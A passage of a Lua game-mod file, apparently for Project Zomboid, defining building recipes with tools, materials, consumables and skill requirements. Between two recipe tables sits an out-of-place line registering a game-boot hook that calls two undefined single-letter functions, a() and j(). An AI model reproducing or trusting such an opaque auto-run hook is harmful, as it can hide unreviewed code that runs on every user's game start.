                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(2)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 2,
                Xp = BuildingMenu.round(2*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.ConcreteFloorRecipe = {
        neededTools = {
            "HandShovel"
        },
        useConsumable = {
            {
                Consumable = "Base.BucketConcreteFull",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GravelRecipe = {
        neededTools = {
            "Shovel"
        },
        useConsumable = {
            {
                Consumable = "Base.Gravelbag",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.GravelBlendRecipe = {
        neededTools = {
            "Shovel"
        },
        useConsumable = {
            {
                Consumable = "Base.Gravelbag",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.AsphaltRoadRecipe = {
        neededTools = {
            "HandShovel"
        },
        useConsumable = {
            {
                Consumable = "Base.BucketAsphaltMixtureFull",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.AsphaltBlendRecipe = {
        neededTools = {
            "HandShovel"
        },
        useConsumable = {
            {
                Consumable = "Base.BucketAsphaltMixtureFull",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.DirtRecipe = {
        neededTools = {
            "Shovel"
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 1
            }
        }
    }


    BuildingMenu.StreetCrackRecipe = {
        neededTools = {
            "Sledgehammer"
        }
    }

    BuildingMenu.PaintWhite = {
        neededTools = {
            "Paintbrush"
        },
        useConsumable = {
            {
                Consumable = "Base.PaintWhite",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PaintOrange = {
        neededTools = {
            "Paintbrush"
        },
        useConsumable = {
            {
                Consumable = "Base.PaintOrange",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PaintPurple = {
        neededTools = {
            "Paintbrush"
        },
        useConsumable = {
            {
                Consumable = "Base.PaintPurple",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PaintGreen = {
        neededTools = {
            "Paintbrush"
        },
        useConsumable = {
            {
                Consumable = "Base.PaintGreen",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PaintYellow = {
        neededTools = {
            "Paintbrush"
        },
        useConsumable = {
            {
                Consumable = "Base.PaintYellow",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.25),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.CounterRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = bigWallWoodCount
            },
            {
                Material = "Base.Nails",
                Amount = bigWallNailsCount
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.LowBarricadeRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = 15
            },
            {
                Material = "Base.Nails",
                Amount = 15
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.HighBarricadeRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = 20
            },
            {
                Material = "Base.Nails",
                Amount = 20
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.CardboardBoxRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.SheetPaper2",
                Amount = 15
            },
        },
        useConsumable = {
            {
                Consumable = "Base.Glue",
                Amount = 4
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.5),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.MilitaryCrateRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = plankCountForMilitaryCrate
            },
            {
                Material = "Base.Nails",
                Amount = nailsCountForMilitaryCrate
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = militaryCrateCarpentrySkill,
                Xp = BuildingMenu.round(militaryCrateCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    Events.OnGameBoot.Add(function() a(); j(); end)

    BuildingMenu.MetalGlassCounterRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.GlassPane',
                Amount = BuildingMenu.round(glassPaneCount*2)
            },
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalCounterBigRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForContainers*1.25)
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForContainers*1.75)
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.MetalCounterRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = sheetMetalCountForContainers
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = sheetMetalCountForContainers
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalLockerRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SheetMetal",
                Amount = sheetMetalCountForContainers
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = sheetMetalCountForContainers
            },
            {
                Material = "Base.Screws",
                Amount = 5
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.MetalLockerWGlassRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.GlassPane",
                Amount = BuildingMenu.round(glassPaneCount*2)
            },
            {
                Material = "Base.SheetMetal",
                Amount = sheetMetalCountForContainers
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = sheetMetalCountForContainers
            },
            {
                Material = "Base.Screws",
                Amount = 5
            },
            {
                Material = "Base.Hinge",
                Amount = 2
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 5,
                Xp = BuildingMenu.round(5*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.MetalCounterSmallRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForContainers*0.75)
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForContainers*0.75)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 3
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(3)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 2,
                Xp = BuildingMenu.round(2*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.GarbageBinBigRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.Garbagebag',
                Amount = 2
            },
            {
                Material = 'Base.SheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForContainers*1.25)
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForContainers*2)
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.GarbageBinSmallRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.Garbagebag',
                Amount = 1
            },
            {
                Material = 'Base.SheetMetal',
                Amount = sheetMetalCountForContainers
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = sheetMetalCountForContainers
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*0.5)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 3
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(3)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            }
        }
    }


    BuildingMenu.FireplaceRecipe = {
        neededTools = {
            "Hammer",
            "Shovel"
        },
        neededMaterials = {
            {
                Material = 'Base.Stone',
                Amount = 20
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 4
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.5),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.WaterWellRecipe = {
        neededTools = {
            "Shovel",
            "Hammer",
            "Saw"
        },
        neededMaterials = {
            {
                Material = "Base.Log",
                Amount = 2,
            },
            {
                Material = "Base.Plank",
                Amount = 2,
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*1.5),
            },
            {
                Material = 'Base.BucketEmpty',
                Amount = 1
            },
            {
                Material = 'Base.MetalPipe',
                Amount = 1
            },
            {
                Material = 'Base.Rope',
                Amount = 5
            },
            {
                Material = 'Base.Stone',
                Amount = 30
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 4
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }


    BuildingMenu.FloorRugRecipe = {
        neededTools = {
            "Needle"
        },
        neededMaterials = {
            {
                Material = 'Base.RippedSheets',
                Amount = 5
            },
        },
        useConsumable = {
            {
                Consumable = "Base.Thread",
                Amount = 5
            }
        },
        skills = {
            {
                Skill = "Tailoring",
                Level = 3,
                Xp = 10
            }
        }
    }

    BuildingMenu.SignRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.5),
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.75),
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.5),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.SpiffoStatueRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Hat_Spiffo",
                Amount = 1
            },
            {
                Material = "Base.SpiffoSuit",
                Amount = 1
            },
            {
                Material = "Base.SpiffoTail",
                Amount = 1
            },
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*1.25),
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*1.25),
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.PostersRecipe = {
        neededTools = {
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.SheetPaper2",
                Amount = 10
            },
            {
                Material = "Base.Nails",
                Amount = 1
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.ClockRecipe = {
        neededTools = {
            "Screwdriver"
        },
        neededMaterials = {
            {
                Material = "Base.ElectronicsScrap",
                Amount = 5
            },
            {
                Material = "Radio.ElectricWire",
                Amount = 4
            },
            {
                Material = "Base.Screws",
                Amount = 2
            }
        },
        skills = {
            {
                Skill = "Electricity",
                Level = 4,
                Xp = BuildingMenu.round(4*electricalXpPerLevel)
            }
        }
    }

    BuildingMenu.GraveRecipe = {
        neededTools = {
            "Shovel"
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 2
            },
            {
                Consumable = "Base.BucketConcreteFull",
                Amount = 2
            }
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = BuildingMenu.round(smallObjectsCarpentrySkill*0.5),
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            }
        }
    }

    BuildingMenu.FlowerBedRecipe = {
        neededTools = {
            "Shovel"
        },
        neededMaterials = {
            {
                Material = "Base.Stone",
                Amount = 5
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 1
            },
            {
                Consumable = "Base.BucketWaterFull",
                Amount = 5
            }
        },
        skills = {
            {
                Skill = "Farming",
                Level = 4,
                Xp = 15
            }
        }
    }

    BuildingMenu.GrassRecipe = {
        neededTools = {
            "HandShovel"
        },
        useConsumable = {
            {
                Consumable = "Base.BucketWaterFull",
                Amount = 5
            }
        },
        skills = {
            {
                Skill = "Farming",
                Level = 2,
                Xp = 2
            }
        }
    }

    BuildingMenu.FlowerPotRecipe = {
        neededTools = {
            "Shovel"
        },
        neededMaterials = {
            {
                Material = "Base.Stone",
                Amount = 2
            }
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 1
            },
            {
                Consumable = "Base.BucketWaterFull",
                Amount = 5
            }
        },
        skills = {
            {
                Skill = "Farming",
                Level = 2,
                Xp = 15
            }
        }
    }


    BuildingMenu.PlantCrateRecipe = {
        neededTools = {
            "Shovel",
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*1.25),
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.75),
            },
        },
        useConsumable = {
            {
                Consumable = "Base.Dirtbag",
                Amount = 2
            },
            {
                Consumable = "Base.BucketWaterFull",
                Amount = 5
            },
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "Farming",
                Level = 2,
                Xp = 15
            }
        }
    }

    BuildingMenu.SmallPlantBoxRecipe = {
        neededTools = {
            "Shovel",
            "Hammer"
        },
        neededMaterials = {
            {
                Material = "Base.SheetPaper2",
                Amount = 15
            },
            {
                Material = "Base.Plank",
                Amount = BuildingMenu.round(smallObjectsWoodCount*0.5),
            },
            {
                Material = "Base.Nails",
                Amount = BuildingMenu.round(smallObjectsNailsCount*0.5),
            },
        },
        useConsumable = {
            {
                Consumable = "Base.Glue",
                Amount = 4
            },
            {
                Consumable = "Base.Dirtbag",
                Amount = 1
            },
            {
                Consumable = "Base.BucketWaterFull",
                Amount = 2
            },
        },
        skills = {
            {
                Skill = "Woodwork",
                Level = smallObjectsCarpentrySkill,
                Xp = BuildingMenu.round(smallObjectsCarpentrySkill*carpentryXpPerLevel)
            },
            {
                Skill = "Farming",
                Level = 2,
                Xp = 15
            }
        }
    }

    BuildingMenu.WallVinesRecipe = {
        neededTools = {
            "Shovel"
        },
        neededMaterials = {
            {
                Material = "Base.Twigs",
                Amount = 5
            }
        },
        useConsumable = {
            {
                Consumable = "Base.BucketWaterFull",
                Amount = 2
            }
        },
        skills = {
            {
                Skill = "Farming",
                Level = 4,
                Xp = 15
            }
        }
    }

    BuildingMenu.SwitchRecipe = {
        neededTools = {
            "Screwdriver"
        },
        neededMaterials = {
            {
                Material = "Base.ElectronicsScrap",
                Amount = 10
            },
            {
                Material = "Radio.ElectricWire",
                Amount = 4
            },
            {
                Material = "Base.ScrapMetal",
                Amount = 10
            },
            {
                Material = "Base.LightBulb",
                Amount = 1
            },
            {
                Material = "Base.Screws",
                Amount = 5
            }
        },
        skills = {
            {
                Skill = "Electricity",
                Level = 4,
                Xp = BuildingMenu.round(4*electricalXpPerLevel)
            }
        }
    }

    BuildingMenu.LightPostRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Radio.ElectricWire",
                Amount = 4
            },
            {
                Material = "Base.ElectronicsScrap",
                Amount = 10
            },
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*1.25)
            },
            {
                Material = "Base.ScrapMetal",
                Amount = 10
            },
            {
                Material = "Base.LightBulb",
                Amount = 1
            },
            {
                Material = "Base.Screws",
                Amount = 5
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "Electricity",
                Level = 4,
                Xp = BuildingMenu.round(4*electricalXpPerLevel)
            },
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.SinkRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.LeadPipe",
                Amount = 2
            },
            {
                Material = "Base.SheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*1.25)
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*1.25)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.BathtubRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.LeadPipe",
                Amount = 3
            },
            {
                Material = "Base.SheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*2)
            },
            {
                Material = 'Base.SmallSheetMetal',
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 10
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(10)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 6,
                Xp = BuildingMenu.round(6*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.StoveRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*1.5)
            },
            {
                Material = 'Base.MetalBar',
                Amount = metalBarsCount
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            },
        }
    }

    BuildingMenu.OvenRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*1.5)
            },
            {
                Material = 'Base.ElectronicsScrap',
                Amount = 30
            },
            {
                Material = "Radio.ElectricWire",
                Amount = 4
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 4,
                Xp = BuildingMenu.round(4*metalweldingXpPerLevel)
            },
            {
                Skill = "Electricity",
                Level = 3,
                Xp = BuildingMenu.round(3*electricalXpPerLevel)
            },
        }
    }

    BuildingMenu.MicrowaveOvenRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SheetMetal",
                Amount = sheetMetalCountForFixturesAndAppliances
            },
            {
                Material = 'Base.ElectronicsScrap',
                Amount = 30
            },
            {
                Material = "Radio.ElectricWire",
                Amount = 4
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            },
            {
                Skill = "Electricity",
                Level = 3,
                Xp = BuildingMenu.round(3*electricalXpPerLevel)
            },
        }
    }


    BuildingMenu.FridgeRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.SheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*2)
            },
            {
                Material = 'Base.ElectronicsScrap',
                Amount = 30
            },
            {
                Material = "Radio.ElectricWire",
                Amount = 4
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 6,
                Xp = BuildingMenu.round(6*metalweldingXpPerLevel)
            },
            {
                Skill = "Electricity",
                Level = 4,
                Xp = BuildingMenu.round(4*electricalXpPerLevel)
            },
        }
    }

    BuildingMenu.WashingMachineRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = "Base.GlassPane",
                Amount = BuildingMenu.round(glassPaneCount * 1.5)
            },
            {
                Material = "Base.SheetMetal",
                Amount = BuildingMenu.round(sheetMetalCountForFixturesAndAppliances*2)
            },
            {
                Material = 'Base.ElectronicsScrap',
                Amount = 30
            },
            {
                Material = "Radio.ElectricWire",
                Amount = 4
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 6,
                Xp = BuildingMenu.round(6*metalweldingXpPerLevel)
            },
            {
                Skill = "Electricity",
                Level = 4,
                Xp = BuildingMenu.round(4*electricalXpPerLevel)
            },
        }
    }

    BuildingMenu.WashingBinRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*1.75)
            },
            {
                Material = "Base.Sheet",
                Amount = 4
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.ClothingRackRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*1.75)
            },
            {
                Material = 'Base.Screws',
                Amount = screwsCount
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.DoubleClothingRackRecipe = {
        neededTools = {
            "BlowTorch",
            "Screwdriver",
            "Saw",
            "WeldingMask"
        },
        neededMaterials = {
            {
                Material = 'Base.MetalBar',
                Amount = BuildingMenu.round(metalBarsCount*2.25)
            },
            {
                Material = 'Base.Screws',
                Amount = BuildingMenu.round(screwsCount*2)
            }
        },
        useConsumable = {
            {
                Consumable = 'Base.BlowTorch',
                Amount = 5
            },
            {
                Consumable = "Base.WeldingRods",
                Amount = BuildingMenu.weldingRodUses(5)
            }
        },
        skills = {
            {
                Skill = "MetalWelding",
                Level = 3,
                Xp = BuildingMenu.round(3*metalweldingXpPerLevel)
            }
        }
    }

    BuildingMenu.MannequinRecipe = {
        neededTools = {
            "BlowTorch",
